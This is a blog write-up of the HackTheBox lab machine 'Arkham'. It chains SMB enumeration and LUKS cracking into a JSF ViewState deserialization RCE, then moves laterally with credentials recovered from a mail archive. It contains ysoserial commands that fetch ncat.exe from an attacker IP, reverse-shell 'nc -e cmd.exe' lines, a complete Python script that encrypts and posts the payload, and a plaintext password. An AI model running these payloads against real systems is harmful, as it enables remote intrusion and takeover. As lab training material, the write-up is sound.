---
title: "HackTheBox - WriteUp 18"
date: 2019-07-18T23:46:54+08:00
description: "HackTheBox 练手 - Arkham - Java Deserialization Vuln"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Arkham

Nmap Enum: 80, IIS, 135+139+445 SMB, 8080 Tomcat, 49666+49667 MSRPC

## User

Try anomymously access the SMB, use `smbclient -U anonymous --no-pass //10.10.10.130/BatShare`, found a `appserv.zip`.

Unarchive it, get `backup.img`, `file` check: `LUKS Encrypted v1[aes, xts-plain64, sha256] partition file`. Run `hashcat` with `rockyou`: 

```bash
$ dd if=backup.img of=header.luks bs=512 count=4097
$ hashcat --session rockhead1 -m 14600 -a 0 -w 3 ./header.luks /usr/share/wordlists/rockyou.txt -o luks_pwd.txt
$ cat luks_pwd.txt
batmanforever
```

Then Mount:

```bash
$ sudo cryptsetup open ./backup.img decrypted
$ sudo mount /dev/mapper/decrypted /mnt/nfs1
```

From mounted files, you could find `tomcat-stuff` with a backup file `appserv.zip` , check it, found two params: `org.apache.myfaces.INIT_SECRET`, `org.apache.myfaces.MAC_SECRET`

So we know it is running JSF (JavaEE, already deprecated now). Check port 80, get IIS 10 Default Page, might be Windows server 2016+ (In fact it's 2019).

Check port 8080, found `:8080/userSubscribe.faces`, as the config we just found in backup image, it is part of the application. All seems fine, input the form and submit, enable burp, you'll find a POST param called `javax.faces.Viewstate`, according to one of the referrence below, we know there's a deserialization RCE, review related source code and spec, we know: it is encrypted and encoded before submit. According to config, it is server-side process, so do some googlefu, found `ysoserial-modified`, use this program to generate payload:

```bash
$ java -jar ./ysoserial-modified.jar CommonsCollections5 powershell 'Invoke-WebRequest http://10.10.16.80:8080/ncat.exe -OutFile nc.exe' > output_serialized_download_nc.bin
$ java -jar ./ysoserial-modified.jar CommonsCollections5 cmd 'nc.exe 10.10.16.80 4488 -e cmd.exe' > output_serialized_revshell.bin
```

According to code review, I wrote a script to help me finish the left stuff:

```python
#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
#  hackthebox_tool
#  Copyright (C) 2019  kmahyyg
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.

# http://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html

# pip3 install pycryptodome requests

from Crypto.Cipher import DES as DESCipher
from Crypto.Hash import SHA1 as SHA1Sum
from Crypto.Hash import HMAC as HMACCipher
import base64
import sys
import requests

# Utility function

def print_help():
    print("\n")
    print('''
    Download ysoserial from https://github.com/pimps/ysoserial-modified , Then:

    java -jar ./ysoserial-modified.jar CommonsCollections5 powershell 'Invoke-WebRequest http://IP:PORT/ncat.exe -OutFile nc.exe' > output_serialized_download_nc.bin
    java -jar ./ysoserial-modified.jar CommonsCollections5 cmd 'nc.exe IP PORT -e cmd.exe' > output_serialized_revshell.bin

    After that, put this script in the same folder with payload , then run this script like this:

    python3 ./encrypt_payload.py output_serialized_revshell.bin

    It will tell you result.
    ''')

def pad(plain_bytes):
    """
    func to pad cleartext to be multiples of 8-byte blocks.
    If you want to encrypt a text message that is not multiples of 8-byte blocks,
    the text message must be padded with additional bytes to make the text message to be multiples of 8-byte blocks.
    """
    number_of_bytes_to_pad = INIT_BS - len(plain_bytes) % INIT_BS
    ascii_string = chr(number_of_bytes_to_pad).encode()
    padding_byte = number_of_bytes_to_pad * ascii_string
    padded_plain_text =  plain_bytes + padding_byte
    return padded_plain_text

# Check user input validity

try:
    if not isinstance(sys.argv[1],str):
        print("Payload not exist.")
        print_help()
        sys.exit(1)
except:
    print("Payload not exist.")
    print_help()
    sys.exit(1)


PAYLOAD_BINARY = sys.argv[1]

# Constant Variable according to Config

INIT_SECRET = base64.b64decode(b"SnNGOTg3Ni0=")
INIT_MODE = DESCipher.MODE_ECB
INIT_BS = DESCipher.block_size
MAC_SECRET = base64.b64decode(b"SnNGOTg3Ni0=")
MYFACES_CHARSET = "iso-8859-1"

# Load the payload in

bindata = open(PAYLOAD_BINARY, 'rb').read()

# Encrypt using DES-ECB-PKCS5

engine1 = DESCipher.new(INIT_SECRET, INIT_MODE)
pt1 = pad(bindata)
enc1 = engine1.encrypt(pt1)

# Sign with HMAC-SHA1

engine2 = HMACCipher.new(MAC_SECRET, enc1, SHA1Sum)
enc2 = engine2.digest()

# Final Result

finalr1 = base64.b64encode(enc1 + enc2)

# HTTP POST Request - Data preparation

postdt = {
    "j_id_jsp_1623871077_1:email":"test1@test2.com",
    "j_id_jsp_1623871077_1:submit":"SIGN UP",
    "j_id_jsp_1623871077_1_SUBMIT":"1",
    "javax.faces.ViewState": finalr1.decode()
}

# HTTP POST Request - Send out

r = requests.post("http://10.10.10.130:8080/userSubscribe.faces", data=postdt, timeout=10)
print("HTTP Status Code: " + str(r.status_code))
print("Please check your webserver log or netcat to check result.")
```

Then you get the reverse shell after execute the script.

User owned.

## Root

Grab your powershell, Check System Info using `Get-ComputerInfo`, Ouch: Windows Server 2019 Standard, so which means you don't need to try about any exploit here. Just go ahead, and find creds hidden in somewhere.

Go to `downloads` of `alfred` user, found another `backup.zip`, get it downloaded, unarchive. `file` check, found an `ost` file: Microsoft Outlook Personal Folder Archive.

Then `readpst ./alfred-otlk.pst -S -teajc ` extract it, `draft/1-image-001.png`, find a screenshot of password `batman:Zx^#QZX+T!123` and `net` command (very useful).

Then issue a powershell to get another shell:

```powershell
> $username = "$env:COMPUTERNAME\batman"
> $password = "Zx^#QZX+T!123"
> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
> Invoke-Command -Credential $credential -ComputerName arkham -Command { cmd /k C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.16.80 3988 -e cmd.exe}
```

After you get another reverse shell, run `whoami /all`, you are now `batman` with local administrator permission. So you can choose to use `RunAs` verb for escalation(just like normally right click - Run as administrator).

Here, issue `net use * \\10.10.10.130\C$` to mount C:\ at Z:\, then cmd to Z:\, you'll be able to read the root flag.

(END)

# Referrence

- https://nmap.org/book/nse-scripts-list.html
- https://blog.pnb.io/2018/02/bruteforcing-linux-full-disk-encryption.html
- https://wiki.archlinux.org/index.php/Dm-crypt/Encrypting_a_non-root_file_system
- https://github.com/Synacktiv-contrib/inyourface/blob/master/README
- https://github.com/pimps/ysoserial-modified
- https://github.com/frohoff/ysoserial
- http://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html
- https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
- http://web.archive.org/web/20170708111726/https://wiki.apache.org/myfaces/Secure_Your_Application
- https://myfaces.apache.org/core22/myfaces-impl/webconfig.html
- https://github.com/apache/myfaces/blob/master/impl/src/main/java/org/apache/myfaces/application/viewstate/StateUtils.java#L237
